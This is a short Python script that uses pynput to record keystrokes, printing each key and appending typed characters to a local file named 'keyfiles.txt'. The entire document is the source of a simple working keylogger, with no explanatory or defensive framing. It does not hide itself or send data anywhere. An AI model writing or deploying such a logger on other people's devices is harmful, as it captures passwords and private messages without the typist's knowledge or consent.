from pynput import keyboard

def keyPressed(key):
  print(str(key))
  with open("keyfiles.txt", "a") as logKey:
    try:
      char = key.char
      logKey.write(char)
    except:
      print("Error")


if __name__ == "__main__":
  listener = keyboard.Listener(on_press=keyPressed)
  listener.start()
  input()